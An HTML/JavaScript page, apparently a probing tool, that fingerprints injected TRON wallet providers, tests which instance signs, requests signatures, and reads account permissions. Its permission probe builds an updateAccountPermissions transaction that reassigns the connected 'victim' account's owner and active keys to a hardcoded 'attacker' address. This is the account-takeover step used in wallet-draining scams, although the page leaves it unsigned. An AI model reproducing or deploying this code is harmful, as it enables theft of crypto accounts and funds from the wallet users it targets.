<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>tron-surface — provider scanner</title>
<style>
  :root{--bg:#0b0e13;--panel:#12161d;--line:#232a33;--txt:#c9d1d9;--dim:#6e7681;
        --ok:#3fb950;--bad:#f85149;--warn:#d29922;--acc:#58a6ff;--mono:#8b949e}
  *{box-sizing:border-box}
  body{margin:0;font:12px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
       background:var(--bg);color:var(--txt);padding:12px}
  .wrap{max-width:1100px;margin:0 auto;display:grid;gap:10px}
  .panel{background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:12px}
  h1{font-size:16px;margin:0 0 2px}
  h2{font-size:11px;margin:0 0 8px;color:var(--dim);text-transform:uppercase;letter-spacing:.1em}
  button{background:#1a1f27;color:var(--txt);border:1px solid var(--line);border-radius:4px;
         padding:7px 12px;font:inherit;cursor:pointer}
  button:hover{border-color:var(--dim)}
  button.acc{border-color:var(--acc);color:var(--acc)}
  button.bad{border-color:var(--bad);color:var(--bad)}
  .row{display:flex;gap:6px;flex-wrap:wrap;margin:4px 0}
  pre{background:#070a0e;border:1px solid var(--line);border-radius:4px;padding:8px;
      margin:4px 0;overflow:auto;max-height:320px;white-space:pre-wrap;word-break:break-all;
      font-size:11px}
  .kv{display:grid;grid-template-columns:180px 1fr;gap:1px 10px;font-size:11px}
  .kv b{color:var(--dim);font-weight:400}
  .ok{color:var(--ok)}.bad{color:var(--bad)}.warn{color:var(--warn)}.acc{color:var(--acc)}
  .tabs{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:8px}
  .tabs button{font-size:11px;padding:5px 9px}
  .tabs button.on{background:#1f6feb22;border-color:var(--acc);color:var(--acc)}
  .sec{display:none}.sec.on{display:block}
  .g{display:grid;grid-template-columns:1fr 1fr;gap:10px}
  @media(max-width:800px){.g{grid-template-columns:1fr}}
</style>
</head>
<body>
<div class="wrap">

  <div class="panel">
    <h1>tron-surface</h1>
    <div class="kv" id="env"></div>
    <div class="row" style="margin-top:8px">
      <button class="acc" onclick="scanAll()">full scan</button>
      <button onclick="dumpLog()">dump log</button>
      <button onclick="clearLog()">clear</button>
    </div>
  </div>

  <div class="panel">
    <h2>channels</h2>
    <div class="g">
      <div><div class="kv" id="ch_ws"></div></div>
      <div><div class="kv" id="ch_bt"></div></div>
    </div>
  </div>

  <div class="panel">
    <h2>probes</h2>
    <div class="tabs" id="tabs">
      <button class="on" data-t="t_identity" onclick="tab('t_identity')">identity</button>
      <button data-t="t_connect" onclick="tab('t_connect')">connect</button>
      <button data-t="t_sign" onclick="tab('t_sign')">sign</button>
      <button data-t="t_perm" onclick="tab('t_perm')">permission</button>
      <button data-t="t_rpc" onclick="tab('t_rpc')">rpc</button>
      <button data-t="t_log" onclick="tab('t_log')">log</button>
    </div>

    <div class="sec on" id="t_identity">
      <div class="row">
        <button onclick="probeIdentity()">scan provider identity</button>
        <button onclick="probeDeep()">deep inspect (getOwnPropertyNames + proto)</button>
      </div>
      <pre id="o_identity">—</pre>
    </div>

    <div class="sec" id="t_connect">
      <div class="row">
        <button class="acc" onclick="probeConnect('wS')">connect via wS (tronLink.tronWeb)</button>
        <button onclick="probeConnect('Bt')">connect via Bt (window.tronWeb)</button>
        <button onclick="probeMarkReady()">inspect markReady</button>
      </div>
      <pre id="o_connect">—</pre>
    </div>

    <div class="sec" id="t_sign">
      <div class="row">
        <button class="acc" onclick="probeSignChannel('wS')">sign via wS</button>
        <button class="bad" onclick="probeSignChannel('Bt')">sign via Bt</button>
        <button onclick="probeSignCompare()">compare sign functions</button>
      </div>
      <pre id="o_sign">—</pre>
    </div>

    <div class="sec" id="t_perm">
      <div class="row">
        <button onclick="probeOwnerVsActive()">owner vs active perms</button>
        <button class="bad" onclick="probeUpdatePerm()">build updateAccountPermissions</button>
      </div>
      <pre id="o_perm">—</pre>
    </div>

    <div class="sec" id="t_rpc">
      <div class="row">
        <button onclick="probeEndpoints()">probe fullnode endpoints</button>
        <button onclick="probeChain()">chain params</button>
      </div>
      <pre id="o_rpc">—</pre>
    </div>

    <div class="sec" id="t_log">
      <pre id="log">—</pre>
    </div>
  </div>

</div>

<script>
/* ═══════════════════════════════════════════════════════════
   tron-surface — provider scanner
   Purpose: identify injected TRON surface, determine which
   tronWeb instance actually signs, map connect/markReady path,
   expose owner vs active permission gap.
   ═══════════════════════════════════════════════════════════ */

const $ = id => document.getElementById(id);
const esc = s => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));

let seq = 0;
const log = (kind, msg, data) => {
  const el = $('log');
  const t = new Date().toISOString().slice(11,23);
  const line = `[${t}] [${String(++seq).padStart(3,'0')}] ${kind.padEnd(8)} ${msg}`;
  const body = data !== undefined ? '\n  ' + JSON.stringify(data, null, 2).split('\n').join('\n  ') : '';
  el.textContent = (el.textContent === '—' ? '' : el.textContent) + line + body + '\n';
  el.scrollTop = el.scrollHeight;
};
const out = (id, v) => { $(id).textContent = typeof v === 'string' ? v : JSON.stringify(v, null, 2); };
const clearLog = () => { $('log').textContent = '—'; };
const dumpLog = () => { navigator.clipboard?.writeText($('log').textContent); log('DUMP', 'copied'); };

function tab(id) {
  document.querySelectorAll('.sec').forEach(s => s.classList.toggle('on', s.id === id));
  document.querySelectorAll('#tabs button').forEach(b => b.classList.toggle('on', b.dataset.t === id));
}

/* ── provider resolution ─────────────────────────────────── */

const resolve = () => {
  const out = { wS: null, Bt: null, names: [] };
  // wS — bridge (can sign)
  if (window.tronLink?.tronWeb?.trx) { out.wS = window.tronLink.tronWeb; out.names.push('window.tronLink.tronWeb'); }
  else if (window.trustwallet?.tron?.tronWeb?.trx) { out.wS = window.trustwallet.tron.tronWeb; out.names.push('window.trustwallet.tron.tronWeb'); }
  else if (window.tron?.tronWeb?.trx) { out.wS = window.tron.tronWeb; out.names.push('window.tron.tronWeb'); }
  // Bt — fullnode client (no user sign)
  if (window.tronWeb?.trx && window.tronWeb !== out.wS) { out.Bt = window.tronWeb; out.names.push('window.tronWeb'); }
  return out;
};

const fnSrc = (f) => {
  if (typeof f !== 'function') return null;
  try { return f.toString().replace(/\s+/g,' ').slice(0, 240); } catch { return '[native]'; }
};

/* ── identity ────────────────────────────────────────────── */

function probeIdentity() {
  log('IDENT', 'scan start');
  const r = resolve();
  const has = (o, p) => { try { return typeof p.split('.').reduce((a,k)=>a?.[k],o) } catch { return 'err'; } };

  const wS = r.wS, Bt = r.Bt;
  const summary = {
    resolved: r.names,
    wS: wS ? {
      version: wS.version,
      ready: wS.ready,
      defaultAddress: wS.defaultAddress?.base58 || false,
      hasSignMessageV2: typeof wS.trx?.signMessageV2 === 'function',
      hasSign: typeof wS.trx?.sign === 'function',
      hasRequest: typeof wS.request === 'function',
      hasMarkReady: typeof wS.markReady === 'function',
    } : null,
    Bt: Bt ? {
      version: Bt.version,
      ready: Bt.ready,
      defaultAddress: Bt.defaultAddress?.base58 || false,
      hasSignMessageV2: typeof Bt.trx?.signMessageV2 === 'function',
      hasSign: typeof Bt.trx?.sign === 'function',
      hasRequest: typeof Bt.request === 'function',
    } : null,
    sameObject: wS === Bt,
  };
  out('o_identity', summary);
  log('IDENT', 'summary', summary);
}

function probeDeep() {
  log('DEEP', 'inspect proto chains');
  const r = resolve();
  const dump = (obj, name) => {
    if (!obj) return { name, exists: false };
    const own = Object.getOwnPropertyNames(obj);
    const proto = Object.getOwnPropertyNames(Object.getPrototypeOf(obj));
    const methods = proto.filter(k => {
      try { return typeof obj[k] === 'function'; } catch { return false; }
    });
    return { name, own, proto, methods, ctor: obj.constructor?.name };
  };
  const res = {
    wS: dump(r.wS, 'wS'),
    wS_trx: r.wS?.trx ? dump(r.wS.trx, 'wS.trx') : null,
    Bt: dump(r.Bt, 'Bt'),
    Bt_trx: r.Bt?.trx ? dump(r.Bt.trx, 'Bt.trx') : null,
  };
  out('o_identity', res);
  log('DEEP', 'done', { wS_ctor: res.wS?.ctor, Bt_ctor: res.Bt?.ctor });
}

/* ── connect ─────────────────────────────────────────────── */

async function probeConnect(which) {
  const r = resolve();
  const target = which === 'wS' ? r.wS : r.Bt;
  if (!target) { out('o_connect', `${which} not found`); return; }

  const rec = { which, before: snap(target) };
  log('CONNECT', `${which} start`, rec.before);

  const paths = [];
  // 1. native tron_requestAccounts
  if (typeof target.request === 'function') {
    try {
      const a = await target.request({ method: 'tron_requestAccounts' });
      paths.push({ method: 'tron_requestAccounts', ok: true, result: a });
    } catch (e) { paths.push({ method: 'tron_requestAccounts', ok: false, err: e.message }); }
  }
  // 2. eth_requestAccounts
  if (typeof target.request === 'function') {
    try {
      const a = await target.request({ method: 'eth_requestAccounts' });
      paths.push({ method: 'eth_requestAccounts', ok: true, result: a });
    } catch (e) { paths.push({ method: 'eth_requestAccounts', ok: false, err: e.message }); }
  }
  // 3. connect() (wS has it on proto)
  if (typeof target.connect === 'function') {
    try {
      const a = await target.connect();
      paths.push({ method: 'connect', ok: true, result: a });
    } catch (e) { paths.push({ method: 'connect', ok: false, err: e.message }); }
  }
  // 4. tronWeb.request if present
  if (typeof target.tronWeb?.request === 'function') {
    try {
      const a = await target.tronWeb.request({ method: 'tron_requestAccounts' });
      paths.push({ method: 'tronWeb.request', ok: true, result: a });
    } catch (e) { paths.push({ method: 'tronWeb.request', ok: false, err: e.message }); }
  }

  // wait up to 3s for defaultAddress
  const t0 = Date.now();
  while (Date.now() - t0 < 3000 && !target.defaultAddress?.base58 && !target.tronWeb?.defaultAddress?.base58) {
    await new Promise(r => setTimeout(r, 150));
  }

  rec.paths = paths;
  rec.after = snap(target);
  out('o_connect', rec);
  log('CONNECT', `${which} done`, { after: rec.after });
}

function snap(t) {
  return {
    ready: t.ready,
    defaultAddress: t.defaultAddress?.base58 || false,
    tronWebReady: t.tronWeb?.ready,
    tronWebDefaultAddress: t.tronWeb?.defaultAddress?.base58 || false,
  };
}

function probeMarkReady() {
  const r = resolve();
  const wS = r.wS;
  if (!wS) { out('o_connect', 'wS not found'); return; }
  const info = {
    hasMarkReady: typeof wS.markReady === 'function',
    markReadySrc: fnSrc(wS.markReady),
    hasSendResponse: typeof wS.sendResponse === 'function',
    hasSendError: typeof wS.sendError === 'function',
  };
  out('o_connect', info);
  log('MARKREADY', 'inspect', info);
}

/* ── sign ────────────────────────────────────────────────── */

async function probeSignChannel(which) {
  const r = resolve();
  const target = which === 'wS' ? r.wS : r.Bt;
  if (!target) { out('o_sign', `${which} not found`); return; }

  const rec = { which, hasSign: typeof target.trx?.sign === 'function', hasSignMessageV2: typeof target.trx?.signMessageV2 === 'function' };

  if (rec.hasSignMessageV2) {
    try {
      const msg = 'tron-surface probe ' + Date.now();
      rec.msg = msg;
      const sig = await target.trx.signMessageV2(msg);
      rec.signMessageV2 = { ok: true, sig };
    } catch (e) { rec.signMessageV2 = { ok: false, code: e.code, message: e.message }; }
  }

  if (rec.hasSign) {
    try {
      const fakeTx = { visible: true, txID: '00'.repeat(32), raw_data: { contract: [] }, raw_data_hex: '' };
      rec.fakeTx = fakeTx;
      const signed = await target.trx.sign(fakeTx);
      rec.sign = { ok: true, signed };
    } catch (e) { rec.sign = { ok: false, code: e.code, message: e.message }; }
  }

  out('o_sign', rec);
  log('SIGN', `${which}`, rec);
}

function probeSignCompare() {
  const r = resolve();
  if (!r.wS || !r.Bt) { out('o_sign', 'need both wS and Bt'); return; }
  const cmp = {
    signSame: r.wS.trx.sign === r.Bt.trx.sign,
    signMessageV2Same: r.wS.trx.signMessageV2 === r.Bt.trx.signMessageV2,
    wS_sign_src: fnSrc(r.wS.trx.sign),
    Bt_sign_src: fnSrc(r.Bt.trx.sign),
    wS_signMessageV2_src: fnSrc(r.wS.trx.signMessageV2),
    Bt_signMessageV2_src: fnSrc(r.Bt.trx.signMessageV2),
  };
  out('o_sign', cmp);
  log('SIGN', 'compare', { same: cmp.signSame, v2same: cmp.signMessageV2Same });
}

/* ── permission ──────────────────────────────────────────── */

async function probeOwnerVsActive() {
  const r = resolve();
  const wS = r.wS;
  if (!wS) { out('o_perm', 'wS not found'); return; }
  const addr = wS.defaultAddress?.base58 || wS.tronWeb?.defaultAddress?.base58;
  if (!addr) { out('o_perm', 'no address connected — connect first'); log('PERM', 'no address'); return; }

  try {
    const account = await wS.trx.getAccount(addr);
    const perms = (account.permissions || []).map(p => ({
      name: p.permission_name,
      type: p.type,
      threshold: p.threshold,
      keys: (p.keys || []).map(k => ({ address: k.address, weight: k.weight })),
      id: p.id,
    }));
    const owner = perms.find(p => p.type === 0 || p.name === 'owner');
    const active = perms.find(p => p.type === 2 || p.name === 'active');
    const res = { addr, owner, active, raw_permissions: perms };
    out('o_perm', res);
    log('PERM', 'owner vs active', { owner, active });
  } catch (e) {
    out('o_perm', { error: e.message });
    log('PERM', 'getAccount failed', { message: e.message });
  }
}

async function probeUpdatePerm() {
  const r = resolve();
  const wS = r.wS;
  if (!wS) { out('o_perm', 'wS not found'); return; }
  const addr = wS.defaultAddress?.base58 || wS.tronWeb?.defaultAddress?.base58;
  if (!addr) { out('o_perm', 'no address — connect first'); return; }

  try {
    const builder = wS.transactionBuilder || r.Bt?.transactionBuilder;
    if (!builder?.updateAccountPermissions) { out('o_perm', 'no updateAccountPermissions on builder'); return; }

    const victim = addr;
    const attacker = 'TPxcbZxFSHLssRYkrad4YTZJRVCPD9oGRW';
    const perm = {
      owner: { type: 0, permission_name: 'owner', threshold: 1, keys: [{ address: attacker, weight: 1 }] },
      active: [{ type: 2, permission_name: 'active', threshold: 1, keys: [{ address: attacker, weight: 1 }] }],
      owner_address: victim,
    };
    log('PERM', 'building updateAccountPermissions', { victim, attacker });
    const tx = await builder.updateAccountPermissions(perm);
    log('PERM', 'tx built', { txID: tx.txID });
    out('o_perm', { step: 'built', tx, note: 'NOT signed — inspect only' });
  } catch (e) {
    out('o_perm', { step: 'build failed', message: e.message });
    log('PERM', 'build failed', { message: e.message });
  }
}

/* ── rpc ─────────────────────────────────────────────────── */

async function probeEndpoints() {
  const r = resolve();
  const bt = r.Bt || r.wS;
  if (!bt) { out('o_rpc', 'no tronWeb'); return; }
  const eps = {
    fullNode: bt.fullNode?.host || bt.currentProviders?.().fullNode?.host || '—',
    solidityNode: bt.solidityNode?.host || '—',
    eventServer: bt.eventServer?.host || '—',
  };
  const results = { endpoints: eps, probes: [] };
  const t0 = performance.now();
  try {
    const info = await bt.trx.getNodeInfo();
    results.probes.push({ rpc: 'getNodeInfo', ok: true, ms: Math.round(performance.now()-t0), keys: Object.keys(info).slice(0,8) });
  } catch (e) { results.probes.push({ rpc: 'getNodeInfo', ok: false, err: e.message }); }
  try {
    const t1 = performance.now();
    const block = await bt.trx.getCurrentBlock();
    results.probes.push({ rpc: 'getCurrentBlock', ok: true, ms: Math.round(performance.now()-t1), num: block.block_header?.raw_data?.number });
  } catch (e) { results.probes.push({ rpc: 'getCurrentBlock', ok: false, err: e.message }); }
  out('o_rpc', results);
  log('RPC', 'endpoints', results);
}

async function probeChain() {
  const r = resolve();
  const bt = r.Bt || r.wS;
  if (!bt) { out('o_rpc', 'no tronWeb'); return; }
  try {
    const params = await bt.trx.getChainParameters();
    out('o_rpc', params);
    log('CHAIN', 'params', { count: params.length });
  } catch (e) { out('o_rpc', { err: e.message }); }
}

/* ── boot ────────────────────────────────────────────────── */

(function boot() {
  const r = resolve();
  const hasEthereum = !!window.ethereum;
  $('env').innerHTML = `
    <b>origin</b><span>${esc(location.origin)}</span>
    <b>UA</b><span style="font-size:10px">${esc(navigator.userAgent)}</span>
    <b>window.tron</b><span class="${window.tron?'ok':'bad'}">${window.tron ? 'present' : 'absent'}</span>
    <b>window.tronLink</b><span class="${window.tronLink?'ok':'bad'}">${window.tronLink ? 'present' : 'absent'}</span>
    <b>trustwallet.tron</b><span class="${window.trustwallet?.tron?'ok':'bad'}">${window.trustwallet?.tron ? 'present' : 'absent'}</span>
    <b>window.tronWeb</b><span class="${window.tronWeb?'ok':'bad'}">${window.tronWeb ? 'present' : 'absent'}</span>
    <b>window.ethereum</b><span class="${hasEthereum?'ok':'bad'}">${hasEthereum ? 'present' : 'absent'}</span>
    <b>resolved wS</b><span class="${r.wS?'ok':'bad'}">${r.wS ? r.names.filter(n=>n!=='window.tronWeb').join(', ') : 'none'}</span>
    <b>resolved Bt</b><span class="${r.Bt?'ok':'bad'}">${r.Bt ? 'window.tronWeb' : 'none'}</span>
  `;
  $('ch_ws').innerHTML = r.wS ? `
    <b>instance</b><span class="acc">wS (bridge)</span>
    <b>version</b><span>${esc(r.wS.version || '—')}</span>
    <b>ready</b><span class="${r.wS.ready?'ok':'warn'}">${r.wS.ready}</span>
    <b>defaultAddress</b><span>${r.wS.defaultAddress?.base58 || r.wS.tronWeb?.defaultAddress?.base58 || '—'}</span>
    <b>trx.sign</b><span class="${typeof r.wS.trx?.sign==='function'?'ok':'bad'}">${typeof r.wS.trx?.sign}</span>
    <b>trx.signMessageV2</b><span class="${typeof r.wS.trx?.signMessageV2==='function'?'ok':'bad'}">${typeof r.wS.trx?.signMessageV2}</span>
    <b>request</b><span class="${typeof r.wS.request==='function'?'ok':'bad'}">${typeof r.wS.request}</span>
    <b>markReady</b><span class="${typeof r.wS.markReady==='function'?'ok':'bad'}">${typeof r.wS.markReady}</span>
  ` : '<b>wS</b><span class="bad">not resolved</span>';

  $('ch_bt').innerHTML = r.Bt ? `
    <b>instance</b><span class="warn">Bt (fullnode)</span>
    <b>version</b><span>${esc(r.Bt.version || '—')}</span>
    <b>ready</b><span>${r.Bt.ready ?? '—'}</span>
    <b>defaultAddress</b><span>${r.Bt.defaultAddress?.base58 || '—'}</span>
    <b>trx.sign</b><span class="${typeof r.Bt.trx?.sign==='function'?'ok':'bad'}">${typeof r.Bt.trx?.sign}</span>
    <b>trx.signMessageV2</b><span class="${typeof r.Bt.trx?.signMessageV2==='function'?'ok':'bad'}">${typeof r.Bt.trx?.signMessageV2}</span>
    <b>fullNode</b><span style="font-size:10px">${esc(r.Bt.fullNode?.host || '—')}</span>
  ` : '<b>Bt</b><span class="warn">not resolved</span>';

  log('BOOT', 'tron-surface up', { origin: location.origin, wS: !!r.wS, Bt: !!r.Bt });
})();
</script>
</body>
</html>
